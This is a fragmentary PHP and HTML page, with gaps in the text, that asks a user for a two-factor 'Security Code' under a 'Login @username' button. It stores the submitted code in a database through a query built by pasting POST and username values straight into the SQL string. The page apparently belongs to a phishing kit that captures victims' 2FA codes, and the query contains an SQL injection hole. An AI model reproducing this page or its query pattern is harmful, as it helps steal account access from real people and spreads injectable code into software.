...
if($_POST){
    ...
    $veriyaz = $spexcon->query("UPDATE `users` SET `faktor`='".$faktor."' WHERE user='".$username."'");
...
<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>"></center>
<br>
...
letter-spacing:;
color:#3d3d3d;
font-size: 20px;"><b><?php echo $faktorbaslik; ?></b> </h1><br>  <h2> 
    
     </h2>
           </h1><br><p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">
  <center><p><?php echo $faktoryazi; ?></p></center>
            </p></center>
<hr>
<div class="wrap-input100 validate-input">
<input  class="input100" type="number" name="factor" placeholder="Security Code">
...
<button  class="btn">Login @<?php echo $username; ?></button>
				<br>
                <br>
        
                </form>
                <form action="confirmed.php?username=$username">
                <div class="container-login100-form-btn" style="margin-top:-20px;">
<button class="btn">I don't have two-factor security</button>
